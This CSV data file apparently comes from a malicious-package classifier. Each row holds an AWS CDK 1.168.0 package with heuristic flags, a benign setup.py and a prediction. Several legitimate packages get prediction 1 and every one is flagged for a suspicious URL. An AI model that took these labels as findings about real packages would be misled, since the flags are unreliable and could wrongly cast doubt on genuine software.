package_name,has_susp_url,Popular,is_license,is_valid_author_emails,is_valid_homepage,PostInstallCommand,min_cfg,has_verylong_string,file_list,setup.py,predictions
aws-cdk.aws-ecs-patterns-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-ecs-patterns@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-ecs-patterns"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ECS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_ecs_patterns"",
        ""aws_cdk.aws_ecs_patterns._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_ecs_patterns._jsii"": [
            ""aws-ecs-patterns@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_ecs_patterns"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-applicationautoscaling==1.168.0"",
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-ecs==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancingv2==1.168.0"",
        ""aws-cdk.aws-events-targets==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-route53-targets==1.168.0"",
        ""aws-cdk.aws-route53==1.168.0"",
        ""aws-cdk.aws-servicediscovery==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-efs-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-efs@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-efs"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::EFS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_efs"",
        ""aws_cdk.aws_efs._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_efs._jsii"": [
            ""aws-efs@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_efs"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.cloud-assembly-schema==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-eks-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-eks@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-eks"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::EKS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_eks"",
        ""aws_cdk.aws_eks._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_eks._jsii"": [
            ""aws-eks@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_eks"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-ssm==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""aws-cdk.lambda-layer-awscli==1.168.0"",
        ""aws-cdk.lambda-layer-kubectl==1.168.0"",
        ""aws-cdk.lambda-layer-node-proxy-agent==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-elasticloadbalancing-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-elasticloadbalancing@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-elasticloadbalancing"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ElasticLoadBalancing"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_elasticloadbalancing"",
        ""aws_cdk.aws_elasticloadbalancing._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_elasticloadbalancing._jsii"": [
            ""aws-elasticloadbalancing@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_elasticloadbalancing"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-elasticloadbalancingv2-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-elasticloadbalancingv2@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-elasticloadbalancingv2"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ElasticLoadBalancingV2"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_elasticloadbalancingv2"",
        ""aws_cdk.aws_elasticloadbalancingv2._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_elasticloadbalancingv2._jsii"": [
            ""aws-elasticloadbalancingv2@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_elasticloadbalancingv2"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-route53==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.cloud-assembly-schema==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-events-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-events@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-events"",
    ""version"": ""1.168.0"",
    ""description"": ""Amazon EventBridge Construct Library"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_events"",
        ""aws_cdk.aws_events._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_events._jsii"": [
            ""aws-events@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_events"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-events-targets-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-events-targets@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-events-targets"",
    ""version"": ""1.168.0"",
    ""description"": ""Event targets for Amazon EventBridge"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_events_targets"",
        ""aws_cdk.aws_events_targets._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_events_targets._jsii"": [
            ""aws-events-targets@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_events_targets"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-apigateway==1.168.0"",
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-codebuild==1.168.0"",
        ""aws-cdk.aws-codepipeline==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-ecs==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kinesis==1.168.0"",
        ""aws-cdk.aws-kinesisfirehose==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-sns-subscriptions==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.aws-stepfunctions==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-globalaccelerator-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-globalaccelerator@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-globalaccelerator"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::GlobalAccelerator"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_globalaccelerator"",
        ""aws_cdk.aws_globalaccelerator._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_globalaccelerator._jsii"": [
            ""aws-globalaccelerator@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_globalaccelerator"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-glue-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-glue@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-glue"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Glue"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_glue"",
        ""aws_cdk.aws_glue._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_glue._jsii"": [
            ""aws-glue@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_glue"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.assets==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-iam-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-iam@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-iam"",
    ""version"": ""1.168.0"",
    ""description"": ""CDK routines for easily assigning correct and minimal IAM permissions"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_iam"",
        ""aws_cdk.aws_iam._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_iam._jsii"": [
            ""aws-iam@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_iam"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-kinesis-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-kinesis@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-kinesis"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Kinesis"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_kinesis"",
        ""aws_cdk.aws_kinesis._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_kinesis._jsii"": [
            ""aws-kinesis@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_kinesis"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
